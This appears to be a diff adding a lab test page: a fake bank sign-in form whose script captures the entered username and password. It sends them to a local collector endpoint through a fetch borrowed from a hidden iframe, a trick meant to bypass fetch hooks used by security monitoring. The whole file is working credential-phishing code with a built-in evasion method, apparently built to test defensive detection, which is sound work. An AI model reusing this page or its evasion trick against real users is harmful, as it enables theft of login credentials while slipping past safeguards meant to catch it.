@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Formosa Demo Bank - Sign in</title></head>
+<body>
+  <h1>Formosa Demo Bank</h1>
+  <p style="color:#a00">LAB ATTACK PAGE - hook evasion via an iframe's clean fetch. Fake data only.</p>
+
+  <input name="username" placeholder="Username">
+  <input name="password" type="password" placeholder="Password">
+  <button type="button" id="login">Sign in</button>
+
+  <script>
+    document.getElementById("login").addEventListener("click", () => {
+      const u = document.querySelector('input[name="username"]').value;
+      const p = document.querySelector('input[name="password"]').value;
+      // Make a hidden iframe and borrow ITS fetch (a separate JS world).
+      const frame = document.createElement("iframe");
+      frame.style.display = "none";
+      document.body.appendChild(frame);
+      const cleanFetch = frame.contentWindow.fetch;
+      cleanFetch.call(frame.contentWindow, "http://127.0.0.1:8002/collect", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "username=" + u + "&password=" + p,
+      });
+    });
+  </script>
+</body></html>
